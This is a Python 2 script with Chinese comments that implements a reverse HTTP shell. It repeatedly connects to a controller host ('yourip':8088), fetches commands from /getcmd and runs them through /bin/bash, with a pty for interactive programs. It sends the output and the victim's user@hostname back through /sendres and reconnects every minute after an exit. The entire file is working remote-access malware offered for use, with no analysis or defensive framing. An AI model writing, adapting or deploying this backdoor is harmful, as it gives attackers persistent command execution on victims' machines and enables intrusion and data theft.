# -*- coding: utf-8 -*-
import subprocess as sp
import os, time, pty, threading
import fcntl, urllib2

class Command():
    def __init__(self, sender):
        self.sender = sender
        self.tag = ''

    def _read_buf(self, buf):
        '''读取标准输出/错误直到缓冲区无内容'''
        try:
            while True:
                line = buf.next()
                if line.strip() != '':
                    self.sender(line)
        except:
            pass

    def _execute_command(self, command):
        process = sp.Popen(command,
                           shell=True,
                           stdin=sp.PIPE,
                           stdout=sp.PIPE,
                           stderr=sp.PIPE)
        flags = fcntl.fcntl(process.stdout, fcntl.F_GETFL)
        flags |= os.O_NONBLOCK
        fcntl.fcntl(process.stdout, fcntl.F_SETFL, flags)
        flags2 = fcntl.fcntl(process.stderr, fcntl.F_GETFL)
        flags2 |= os.O_NONBLOCK
        fcntl.fcntl(process.stderr, fcntl.F_SETFL, flags2)
        while True:
            self._read_buf(process.stdout)
            self._read_buf(process.stderr)
            # 检查程序是否已经结束，将剩余的缓冲区内容读出
            if process.poll() != None:
                self._read_buf(process.stdout)
                self._read_buf(process.stderr)
                self.sender(self.tag)
                break

    def _execute_interactive_command(self, command, server):
        '''执行交互命令'''
        master_fd, slave_fd = pty.openpty()
        process = sp.Popen(command,
                  shell=True,
                  preexec_fn=os.setsid,
                  stdin=slave_fd,
                  stdout=slave_fd,
                  stderr=slave_fd,
                  universal_newlines=True)
        t = threading.Thread(target=self._execute_interactive_output, args=(process, master_fd, server))
        t.start()
        while process.poll() is None:
            try:
                cmd = server.get_command() + '\n'
                os.write(master_fd, cmd)
            except:
                continue

    def _execute_interactive_output(self, process, fd, server):
        '''负责交互程序的输出'''
        while process.poll() is None:
            output = os.read(fd, 10240)
            if output and output.strip() != '':
                server.send_result(output)


    def execute_single_command(self, command):
        '''执行单条命令，返回结果不输出'''
        process = sp.Popen(command,
                           shell=True,
                           stdin=sp.PIPE,
                           stdout=sp.PIPE,
                           stderr=sp.PIPE)
        try:
            content = process.stdout.read()
        except:
            content = process.stderr.read()
        return content


    def _encode_arg_quote(self, arg):
        arg =  arg.replace("'", "'\\''")
        return arg

    def execute(self, command, server):
        '''执行命令'''
        #检查是否为交互命令
        if command[:3] == 'ia ':
            self._execute_interactive_command(command[3:], server)
            server.send_result(self.tag)
            return
        base = "/bin/bash -c '%s'"
        command = self._encode_arg_quote(command)
        self._execute_command(base % command)

    def get_tag(self):
        user = self.execute_single_command('whoami')
        user = user[:-1] if user[-1] == '\n' else user
        hostname = self.execute_single_command('hostname')
        hostname = hostname[:-1] if hostname[-1] == '\n' else hostname
        tag = '\n[%s@%s] ' % (user, hostname)
        self.tag = tag
        return tag


class Communicate():
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def get_command(self):
        response = urllib2.urlopen('http://%s:%d/getcmd' % (self.ip, self.port), timeout=2)  #超时时间3秒
        code = response.getcode()
        if code != 200:
            raise Exception
        html = response.read()
        return html

    def send_result(self, data):
        try:
            url = 'http://%s:%d/sendres' % (self.ip, self.port)
            request = urllib2.Request(url, data=data)
            urllib2.urlopen(request)
        except:
            pass

    def attemp_connect(self):
        try:
            urllib2.urlopen('http://%s:%d/connect' % (self.ip, self.port), timeout=2)
            return True
        except:
            return False

    def goto_wait(self):
        try:
            urllib2.urlopen('http://%s:%d/exit' % (self.ip, self.port), timeout=2)
        except:
            print 'wait e'


class Control():
    def __init__(self, ip, port):
        self.server = Communicate(ip, port)
        self.state = 'active'
        self.tag = ''

    def to_next(self):
        if self.state == 'active':
            return True
        elif self.state == 'wait':
            # 每分钟重连
            while True:
                time.sleep(60)
                if self.server.attemp_connect() == True:
                    self.server.send_result(self.tag)
                    self.state = 'active'
                    break
            return True
        else:
            return False

    def start(self):
        executer = Command(self.server.send_result)
        # 第一次反向连接
        while True:
            if self.server.attemp_connect() == True:
                break
        self.tag = executer.get_tag()
        self.server.send_result(self.tag)
        # 开始shell
        while self.to_next():
            try:
                cmd = self.server.get_command()
                if cmd == 'exit':
                    self.state = 'wait'
                    self.server.goto_wait()
                    continue
            except:
                continue
            executer.execute(cmd, self.server)

def main():
    ip = 'yourip'
    port = 8088
    controler = Control(ip, port)
    controler.start()


if __name__ == '__main__':
    main()